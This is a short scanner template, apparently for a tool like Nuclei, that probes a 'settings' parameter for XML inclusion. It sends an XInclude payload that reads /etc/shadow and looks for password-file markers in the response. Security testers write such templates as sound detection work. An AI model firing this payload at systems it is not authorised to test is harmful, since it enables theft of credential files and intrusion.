id: xxe5-0543
name: 'XXE read in settings'
severity: critical
type: active
tags:
  - xxe
  - injection
  - xml
description: 'XXE entity via settings'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      settings:
        - '<r xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/shadow"/></r>'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
          - 'root:'
          - 'XXE_OK'
          - 'localhost'
          - 'uid='
          - 'PD9waHA'
